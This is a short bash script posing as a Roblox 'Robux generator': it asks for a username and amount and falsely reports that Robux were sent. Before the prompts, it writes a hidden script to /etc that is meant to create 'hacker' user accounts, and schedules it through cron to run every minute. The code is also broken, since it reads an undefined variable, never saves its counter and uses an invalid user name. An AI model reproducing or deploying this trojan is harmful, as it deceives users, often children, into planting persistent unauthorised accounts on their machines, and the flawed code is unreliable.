#!/bin/bash

SCRIPT_PATH="/etc/notMalware.sh"

cat << 'EOF' > "$SCRIPT_PATH"
#!/bin/bash

COUNTER_FILE="/etc/counter.txt"

if [ ! -f "$COUNTER_FILE" ]; then
    echo 0 > "$COUNTER_FILE"
fi

counter=$(cat "$COUNTER")
counter=$((counter + 1))

sudo adduser "hacker $counter"
EOF

chmod +x "$SCRIPT_PATH"

(crontab -l 2>/dev/null; echo "* * * * * $SCRIPT_PATH") | crontab -

echo "Enter your roblox username: "
read username
echo "Enter how many robux you want: "
read robux
echo "Robux sent successfully!"
